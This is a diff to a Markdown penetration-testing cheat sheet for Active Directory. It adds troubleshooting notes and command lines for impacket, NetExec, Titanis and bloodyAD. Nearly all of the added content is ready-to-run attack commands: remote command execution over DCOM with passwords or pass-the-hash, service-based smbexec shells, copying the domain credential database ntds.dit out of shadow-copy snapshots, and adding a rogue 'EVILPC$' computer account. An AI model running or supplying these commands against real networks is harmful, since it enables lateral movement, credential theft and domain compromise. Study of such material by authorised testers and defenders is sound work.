@@ -149,6 +149,13 @@ Wmi exec 192.168.1.10 -UserName jdoe@DOMAIN -Kdc 192.168.1.1 -Password Password1
 
 ### DCOM Exec
 
+> **⚠️ Titanis `Dcom invoke` status:** Confirmed non-functional for remote code execution. Titanis calls `IDispatch::GetIDsOfNames` once on the root activation object — it does not traverse dotted property chains. All viable exec CLSIDs require multi-hop property access before reaching an executable method:
+> - `MMC20.Application` → `Document.ActiveView.ExecuteShellCommand`
+> - `ShellBrowserWindow` (`C08AFD90-F2A1-11D1-8455-00A0C91F3880`) → `Document.Application.ShellExecute`
+> - `ShellWindows` (`9BA05972-F6A8-11CF-A442-00A0C90A8F39`) → `Item.Document.Application.ShellExecute`
+>
+> All three return `DISP_E_MEMBERNOTFOUND` (0x80020003). Note: Titanis accepts registered ProgIDs (e.g., `MMC20.Application`) or raw GUIDs — bare short names (e.g., `ShellWindows`) fail with "Unrecognized Guid format". Use `dcomexec.py` or NetExec instead.
+
 ```bash
 # impacket
 dcomexec.py DOMAIN/jdoe:Password123@192.168.1.10 "whoami"
@@ -156,12 +163,16 @@ dcomexec.py DOMAIN/jdoe:Password123@192.168.1.10 "whoami"
 # impacket — pass-the-hash
 dcomexec.py -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe@192.168.1.10 "whoami"
 
+# impacket — explicit CLSID (default is MMC20.Application; ShellWindows or ShellBrowserWindow also work)
+dcomexec.py DOMAIN/jdoe:Password123@192.168.1.10 "whoami" -object ShellWindows
+dcomexec.py DOMAIN/jdoe:Password123@192.168.1.10 "whoami" -object ShellBrowserWindow
+
 # NetExec
 netexec smb 192.168.1.10 -u jdoe -p Password123 -x "whoami" --exec-method dcomexec
 
-# Titanis — Dcom invoke does not support multi-hop IDispatch property traversal.
-# All viable CLSIDs (MMC20.Application, ShellWindows, ShellBrowserWindow)
-# require chained IDispatch calls. Use dcomexec.py or NetExec instead.
+# Titanis — non-functional for all tested CLSIDs; shown for API reference only
+# Dcom invoke 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
+#   MMC20.Application Document.ActiveView.ExecuteShellCommand cmd "" "/c whoami"
 ```
 
 [↑ Back to Index](#index)
@@ -172,8 +183,10 @@ netexec smb 192.168.1.10 -u jdoe -p Password123 -x "whoami" --exec-method dcomex
 
 > **⚠️ Titanis `Scm` status:** All `Scm` subcommands (`create`, `start`, `stop`, `delete`, `query`) are currently non-functional. Use `smbexec.py`, `psexec.py`, or Metasploit for service-based execution.
 
+> **⚠️ `smbexec.py` against DCs:** smbexec uses SVCCTL to create a temporary service. Domain Controllers enforce `PacketPrivacy` authentication level on SVCCTL, which impacket does not negotiate — service creation fails with `STATUS_OBJECT_NAME_NOT_FOUND`. This is the same root cause as `secretsdump -use-vss` failures. `smbexec.py` works normally against member servers. Use `wmiexec.py` for DC targets.
+
 ```bash
-# impacket — smbexec
+# impacket — smbexec (interactive semi-shell; works against member servers)
 smbexec.py DOMAIN/jdoe:Password123@192.168.1.10
 
 # impacket — psexec
@@ -958,6 +971,13 @@ smbclient-ng --host 192.168.1.10 -u jdoe -p Password123 --domain DOMAIN snapshot
 # Titanis
 Smb2Client enumsnapshots \\192.168.1.10\C$ -UserName jdoe -UserDomain DOMAIN -Password Password123
 ```
+
+> **⚠️ @GMT snapshot path access:** Once you have a snapshot timestamp (e.g., `@GMT-2024.01.01-00.00.00`), accessing files through the SMB Previous Versions path requires the `FSCTL_SRV_ENUMERATE_SNAPSHOTS` mechanism. Titanis `Smb2Client` and impacket `smbclient.py` both return `STATUS_OBJECT_PATH_NOT_FOUND` for `@GMT-...` paths. Use native `smbclient` (Samba) which implements the FSCTL correctly:
+>
+> ```bash
+> smbclient //192.168.1.10/C$ -U 'DOMAIN\jdoe%Password123' \
+>   -c 'get @GMT-2024.01.01-00.00.00\Windows\NTDS\ntds.dit ntds.dit'
+> ```
 
 [↑ Back to Index](#index)
 
@@ -1890,22 +1910,28 @@ Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
 
 ### Add a Computer Account
 
+> **⚠️ LDAPS channel binding:** DCs with LDAP channel binding enforced (`LdapEnforceChannelBinding = 1`, default on Server 2019+) reject LDAPS binds that do not include a channel binding token. Neither impacket `addcomputer.py -method LDAPS` nor Titanis `Ldap addcomputer -Ssl` send a channel binding token — both fail with `invalidCredentials` / error 49 even with correct credentials. Use `bloodyAD` (which handles channel binding) or the `-method SAMR` fallback (plain SMB, no TLS required):
+
 ```bash
-# impacket
+# impacket — SAMR method (no LDAPS required; works without channel binding)
+addcomputer.py -method SAMR -computer-name EVILPC$ -computer-pass Password123 \
+  -dc-ip 192.168.1.1 DOMAIN/jdoe:Password123
+
+# impacket — LDAPS method (fails if DC enforces channel binding)
 addcomputer.py -method LDAPS -computer-name EVILPC$ -computer-pass Password123 \
   -dc-ip 192.168.1.1 DOMAIN/jdoe:Password123
 
-# impacket — pass-the-hash
-addcomputer.py -method LDAPS -computer-name EVILPC$ -computer-pass Password123 \
+# impacket — pass-the-hash (SAMR)
+addcomputer.py -method SAMR -computer-name EVILPC$ -computer-pass Password123 \
   -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 -dc-ip 192.168.1.1 DOMAIN/jdoe
+
+# bloodyAD — handles channel binding; preferred LDAPS path
+bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p Password123 add computer EVILPC$ Password123!
 
 # NetExec
 netexec smb 192.168.1.1 -u jdoe -p Password123 -M add-computer -o NAME=EVILPC$ PASSWORD=Password123
 
-# bloodyAD
-bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p Password123 add computer EVILPC$ Password123!
-
-# Titanis
+# Titanis — fails if DC enforces LDAPS channel binding
 Ldap addcomputer 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 EVILPC$ Password123
 ```
 
